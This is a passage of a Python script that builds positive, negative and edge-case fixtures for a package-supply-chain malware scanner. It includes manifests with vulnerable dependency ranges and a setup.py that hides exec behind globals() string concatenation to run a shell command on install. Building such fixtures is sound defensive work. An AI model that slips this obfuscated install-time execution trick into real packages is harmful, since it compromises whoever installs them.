  <version>1.0.0</version>
  <dependencies>
    <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-web</artifactId><version>2.6.0</version></dependency>
  </dependencies>
</project>
""",
        },
        "desc": "Maven project with transitive log4j dependency in CVE range (fires L2-MAVEN-ADV-001).",
        "rules": ["L2-MAVEN-ADV-001"],
    },
    {
        "name": "cve_nuget_newtonsoft_range_overlap",
        "files": {
            "CveNewtonsoft.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>CveNewtonsoft</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Newtonsoft.Json" Version="12.0.3" />
  </ItemGroup>
</Project>
""",
        },
        "desc": "NuGet package with Newtonsoft.Json in CVE range (fires L2-NUGET-ADV-001).",
        "rules": ["L2-NUGET-ADV-001"],
    },
    {
        "name": "cve_nuget_newtonsoft_transitive",
        "files": {
            "CveNewtonsoftTrans.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>CveNewtonsoftTrans</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Microsoft.AspNetCore.Mvc.NewtonsoftJson" Version="6.0.0" />
  </ItemGroup>
</Project>
""",
        },
        "desc": "NuGet package with transitive Newtonsoft.Json in CVE range (fires L2-NUGET-ADV-001).",
        "rules": ["L2-NUGET-ADV-001"],
    },
    {
        "name": "cve_rubygems_rack_range_overlap",
        "files": {
            "Gemfile": "source 'https://rubygems.org'\ngem 'rack', '~> 2.2.0'\n",
            "cve_rack.gemspec": """Gem::Specification.new do |s|
  s.name = "cve_rack"
  s.version = "0.1.0"
  s.add_dependency "rack", "~> 2.2.0"
  s.authors = ["Dev"]
end
""",
        },
        "desc": "RubyGem with rack in CVE range (fires L2-RUBYGEMS-ADV-001).",
        "rules": ["L2-RUBYGEMS-ADV-001"],
    },
    {
        "name": "cve_rubygems_rack_transitive",
        "files": {
            "Gemfile": "source 'https://rubygems.org'\ngem 'rails', '~> 6.1.0'\n",
            "cve_rack_trans.gemspec": """Gem::Specification.new do |s|
  s.name = "cve_rack_trans"
  s.version = "0.1.0"
  s.add_dependency "rails", "~> 6.1.0"
  s.authors = ["Dev"]
end
""",
        },
        "desc": "RubyGem with transitive rack dependency in CVE range (fires L2-RUBYGEMS-ADV-001).",
        "rules": ["L2-RUBYGEMS-ADV-001"],
    },
]


def generate_cve_fixtures():
    count = 0
    for pat in CVE_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1
    return count


# ─── NEGATIVE FIXTURE GENERATORS ────────────────────────────────────────

NEGATIVE_NPM_NAMES = [
    "clean-express-app",
    "clean-react-app",
    "clean-api-server",
    "clean-web-app",
    "clean-cli-tool",
    "clean-utility-lib",
    "clean-auth-middleware",
    "clean-logger-lib",
    "clean-validator-lib",
    "clean-cache-lib",
    "clean-db-connector",
    "clean-queue-worker",
    "clean-email-service",
    "clean-file-uploader",
    "clean-rate-limiter",
    "clean-health-checker",
    "clean-config-loader",
    "clean-metrics-collector",
    "clean-error-handler",
    "clean-event-emitter",
    "clean-stream-processor",
    "clean-data-transformer",
    "clean-scheduler-lib",
    "clean-cron-job",
    "clean-batch-processor",
    "clean-template-engine",
    "clean-i18n-lib",
    "clean-session-manager",
    "clean-cors-handler",
    "clean-csrf-protection",
    "clean-http-router",
    "clean-json-parser",
    "clean-yaml-reader",
    "clean-env-loader",
    "clean-path-resolver",
    "clean-string-formatter",
    "clean-date-formatter",
    "clean-number-utils",
    "clean-array-utils",
    "clean-object-utils",
    "clean-promise-utils",
    "clean-async-queue",
    "clean-throttle-lib",
    "clean-debounce-lib",
    "clean-memoize-lib",
    "clean-retry-lib",
    "clean-circuit-breaker",
    "clean-bulkhead-lib",
    "clean-timeout-lib",
    "clean-interval-lib",
]

NEGATIVE_PYPI_NAMES = [
    "clean-data-processor",
    "clean-math-utils",
    "clean-string-utils",
    "clean-file-handler",
    "clean-config-parser",
    "clean-log-formatter",
    "clean-date-utils",
    "clean-collection-utils",
    "clean-http-client",
    "clean-json-utils",
    "clean-csv-processor",
    "clean-xml-parser",
    "clean-yaml-loader",
    "clean-env-manager",
    "clean-path-utils",
    "clean-net-utils",
    "clean-crypto-utils",
    "clean-encoding-utils",
    "clean-compression-lib",
    "clean-serialization-lib",
    "clean-validator-utils",
    "clean-schema-validator",
    "clean-type-checker",
    "clean-assert-utils",
    "clean-test-helper",
    "clean-mock-generator",
    "clean-fixture-loader",
    "clean-benchmark-utils",
    "clean-profiler-lib",
    "clean-tracer-lib",
]

NEGATIVE_GO_NAMES = [
    "clean-webserver",
    "clean-api-handler",
    "clean-middleware-lib",
    "clean-config-reader",
    "clean-log-writer",
    "clean-metrics-exporter",
    "clean-health-endpoint",
    "clean-auth-handler",
    "clean-db-accessor",
    "clean-cache-client",
    "clean-queue-consumer",
    "clean-event-publisher",
    "clean-file-watcher",
    "clean-signal-handler",
    "clean-graceful-shutdown",
]

NEGATIVE_CARGO_NAMES = [
    "clean_web_framework",
    "clean_serializer",
    "clean_http_client",
    "clean_config_loader",
    "clean_logger_crate",
    "clean_metrics_crate",
    "clean_auth_crate",
    "clean_db_crate",
    "clean_cache_crate",
    "clean_queue_crate",
    "clean_file_watcher",
    "clean_signal_handler",
    "clean_task_runner",
    "clean_scheduler_crate",
    "clean_validator_crate",
]

NEGATIVE_MAVEN_NAMES = [
    "clean-rest-api",
    "clean-data-access",
    "clean-config-service",
    "clean-auth-service",
    "clean-notification-service",
    "clean-scheduler-service",
    "clean-reporting-service",
    "clean-audit-service",
    "clean-cache-service",
    "clean-queue-service",
]

NEGATIVE_RUBYGEMS_NAMES = [
    "clean_web_gem",
    "clean_api_gem",
    "clean_auth_gem",
    "clean_logger_gem",
    "clean_config_gem",
    "clean_mailer_gem",
    "clean_parser_gem",
    "clean_validator_gem",
    "clean_cache_gem",
    "clean_queue_gem",
]

NEGATIVE_NUGET_NAMES = [
    "CleanRestApi",
    "CleanDataAccess",
    "CleanAuthService",
    "CleanLoggerLib",
    "CleanConfigLib",
    "CleanMailerLib",
    "CleanParserLib",
    "CleanValidatorLib",
    "CleanCacheLib",
    "CleanQueueLib",
]


def generate_negative_fixtures():
    count = 0
    for name in NEGATIVE_NPM_NAMES:
        dirname = f"clean_npm_{name.replace('-', '_')}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                "package.json": json.dumps(
                    {
                        "name": name,
                        "version": "1.0.0",
                        "description": f"A clean npm package: {name}",
                        "main": "index.js",
                        "license": "MIT",
                        "engines": {"node": ">=18.0.0"},
                        "repository": {"type": "git", "url": f"git+https://github.com/example/{name}.git"},
                        "author": "Example Author <author@example.com>",
                    },
                    indent=2,
                ),
                "index.js": "'use strict';\n\nmodule.exports = { version: '1.0.0' };\n",
            },
            {
                "label": "negative",
                "description": f"A clean npm package '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": [
                    "L2-POST-001",
                    "L2-OBFS-001",
                    "L2-OBFS-002",
                    "L2-OBFS-003",
                    "L2-OBFS-004",
                    "L2-CRED-001",
                    "L2-NETEX-001",
                    "L2-WORM-001",
                    "L2-SIDELOAD-001",
                    "L2-ENGIN-001",
                    "L2-FORK-001",
                    "L2-LICENSE-001",
                    "L2-MAINT-001",
                    "L2-PROV-001",
                    "L2-MANI-001",
                    "L2-MANI-002",
                    "L2-BUND-001",
                    "L2-IOC-001",
                    "L2-LOCK-001",
                    "L2-PNPM-001",
                    "L2-TYPO-001",
                    "L2-DEPC-001",
                    "L2-ADV-001",
                ],
            },
        )
        count += 1

    for name in NEGATIVE_PYPI_NAMES:
        dirname = f"clean_pypi_{name}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                "pyproject.toml": f"""[build-system]
requires = ["setuptools>=61.0", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "{name}"
version = "0.1.0"
description = "A clean Python library: {name}"
requires-python = ">=3.9"
dependencies = []
""",
                f"{name.replace('-', '_')}/__init__.py": f'"""A clean Python library: {name}."""\n\n__version__ = "0.1.0"\n',
            },
            {
                "label": "negative",
                "description": f"A clean PyPI package '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": [
                    "L2-PYPI-OBFS-001",
                    "L2-PYPI-OBFS-002",
                    "L2-PYPI-OBFS-003",
                    "L2-PYPI-OBFS-004",
                    "L2-PYPI-OBFS-005",
                    "L2-PYPI-OBFS-006",
                    "L2-PYPI-OBFS-007",
                    "L2-PYPI-POST-001",
                    "L2-PYPI-TYPO-001",
                    "L2-PYPI-DEPC-001",
                    "L2-PYPI-ADV-001",
                ],
            },
        )
        count += 1

    for name in NEGATIVE_GO_NAMES:
        dirname = f"clean_go_{name}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                "go.mod": f"module github.com/example/{name}\ngo 1.21\n",
                f"{name}.go": f'// Package {name} is a clean Go module.\npackage {name}\n\nfunc Hello() string {{ return "hello" }}\n',
            },
            {
                "label": "negative",
                "description": f"A clean Go module '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": ["L2-GO-TYPO-001", "L2-GO-DEPC-001", "L2-GO-ADV-001"],
            },
        )
        count += 1

    for name in NEGATIVE_CARGO_NAMES:
        dirname = f"clean_cargo_{name}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                "Cargo.toml": f"""[package]
name = "{name}"
version = "0.1.0"
edition = "2021"
description = "A clean Rust crate: {name}"
license = "MIT"

[dependencies]
""",
                "src/lib.rs": f'//! A clean Rust crate: {name}.\n\npub fn hello() -> &\'static str {{ "hello" }}\n',
            },
            {
                "label": "negative",
                "description": f"A clean Rust crate '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": ["L2-CARGO-TYPO-001", "L2-CARGO-DEPC-001", "L2-CARGO-ADV-001"],
            },
        )
        count += 1

    for name in NEGATIVE_MAVEN_NAMES:
        dirname = f"clean_maven_{name}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                "pom.xml": f"""<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>{name}</artifactId>
  <version>1.0.0</version>
  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.11.0</version>
        <configuration><source>17</source><target>17</target></configuration>
      </plugin>
    </plugins>
  </build>
</project>
""",
            },
            {
                "label": "negative",
                "description": f"A clean Maven project '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": ["L2-BUILD-001"],
            },
        )
        count += 1

    for name in NEGATIVE_RUBYGEMS_NAMES:
        dirname = f"clean_rubygems_{name}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                "Gemfile": "source 'https://rubygems.org'\ngemspec\n",
                f"{name}.gemspec": f"""Gem::Specification.new do |s|
  s.name = "{name}"
  s.version = "0.1.0"
  s.summary = "A clean Ruby gem: {name}"
  s.authors = ["Example Author"]
end
""",
            },
            {
                "label": "negative",
                "description": f"A clean Ruby gem '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": ["L2-BUILD-001"],
            },
        )
        count += 1

    for name in NEGATIVE_NUGET_NAMES:
        dirname = f"clean_nuget_{name}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(NEGATIVE_DIR, dirname),
            {
                f"{name}.csproj": f"""<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>{name}</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
</Project>
""",
            },
            {
                "label": "negative",
                "description": f"A clean NuGet package '{name}' with no suspicious patterns. Should produce zero findings.",
                "forbidden_rule_ids": ["L2-BUILD-001"],
            },
        )
        count += 1

    return count


# ─── TRICKY / EDGE-CASE GENERATORS ──────────────────────────────────────

TRICKY_PATTERNS = [
    {
        "name": "tricky_npm_dual_license",
        "files": {
            "package.json": json.dumps(
                {"name": "dual-license", "version": "1.0.0", "license": "(MIT OR Apache-2.0)"}, indent=2
            ),
        },
        "desc": "npm package with dual license expression (should not fire L2-LICENSE-001).",
        "expected_clean": True,
    },
    {
        "name": "tricky_npm_git_dep_safe",
        "files": {
            "package.json": json.dumps(
                {"name": "safe-git-dep", "version": "1.0.0", "dependencies": {"express": "github:expressjs/express"}},
                indent=2,
            ),
        },
        "desc": "npm package with GitHub dependency on a well-known package (edge case for L2-SIDELOAD-001).",
        "expected_clean": True,
    },
    {
        "name": "tricky_npm_reads_etc_hosts",
        "files": {
            "package.json": json.dumps(
                {"name": "reads-hosts", "version": "1.0.0", "scripts": {"postinstall": "node check.js"}}, indent=2
            ),
            "check.js": "const fs = require('fs'); const hosts = fs.readFileSync('/etc/hosts', 'utf8'); console.log(hosts);\n",
        },
        "desc": "npm package reading /etc/hosts (not a credential file, but reads system file).",
        "expected_clean": True,
    },
    {
        "name": "tricky_pypi_exec_compile",
        "files": {
            "setup.py": "from setuptools import setup\ncode = compile('1+1', '<string>', 'eval')\nsetup(name=\"safe-compile\", version=\"1.0.0\")\n",
        },
        "desc": "PyPI package using compile() for a safe expression (should not fire L2-PYPI-OBFS-001).",
        "expected_clean": True,
    },
    {
        "name": "tricky_pypi_hex_buffer",
        "files": {
            "setup.py": 'from setuptools import setup\ndata = b\'\\x00\\x01\\x02\\x03\'\nsetup(name="hex-buffer", version="1.0.0")\n',
        },
        "desc": "PyPI package with hex bytes that are not exec'd (should not fire L2-PYPI-OBFS-003).",
        "expected_clean": True,
    },
    {
        "name": "tricky_typosquat_lowpop",
        "files": {
            "package.json": json.dumps({"name": "exprezz-lite", "version": "1.0.0"}, indent=2),
        },
        "desc": "npm package named 'exprezz-lite' — edit dist from 'express' but with suffix (edge case for L2-TYPO-001).",
        "expected_clean": True,
    },
    {
        "name": "tricky_pypi_obfs_exec_namespace_bypass",
        "files": {
            "setup.py": "from setuptools import setup\ng = globals()\ng['ex' + 'ec']('import os; os.system(\"id\")')\nsetup(name=\"namespace-bypass\", version=\"1.0.0\")\n",
        },
        "desc": "PyPI package using globals() namespace bypass for exec (fires L2-PYPI-OBFS-001).",
        "expected_rule_ids": ["L2-PYPI-OBFS-001", "L2-PYPI-POST-001"],
    },
]


def generate_tricky_fixtures():
    count = 0
    for pat in TRICKY_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(TRICKY_DIR, dirname)):
            continue
        fixture = {
            "label": "tricky",
            "description": pat["desc"],
        }
        if pat.get("expected_clean"):
            fixture["expected_clean"] = True
        if pat.get("expected_rule_ids"):
            fixture["expected_rule_ids"] = pat["expected_rule_ids"]
        write_fixture(
            os.path.join(TRICKY_DIR, dirname),
            pat["files"],
            fixture,
        )
        count += 1
    return count


# ─── MAIN ───────────────────────────────────────────────────────────────


def main():
    total = 0
    total += generate_typosquat_fixtures()
    total += generate_obfuscation_fixtures()
    total += generate_postinstall_fixtures()
    total += generate_credential_fixtures()
    total += generate_worm_fixtures()
    total += generate_dep_confusion_fixtures()
    total += generate_manifest_fixtures()
    total += generate_cve_fixtures()
    total += generate_negative_fixtures()
    total += generate_tricky_fixtures()

    # Count final totals
    pos = len([d for d in os.listdir(POSITIVE_DIR) if os.path.isdir(os.path.join(POSITIVE_DIR, d))])
    neg = len([d for d in os.listdir(NEGATIVE_DIR) if os.path.isdir(os.path.join(NEGATIVE_DIR, d))])
    tricky = len([d for d in os.listdir(TRICKY_DIR) if os.path.isdir(os.path.join(TRICKY_DIR, d))])
    print(f"Generated {total} new fixtures")
    print(f"Positive: {pos}, Negative: {neg}, Tricky: {tricky}")
    print(f"Total: {pos + neg + tricky}")


if __name__ == "__main__":
    main()

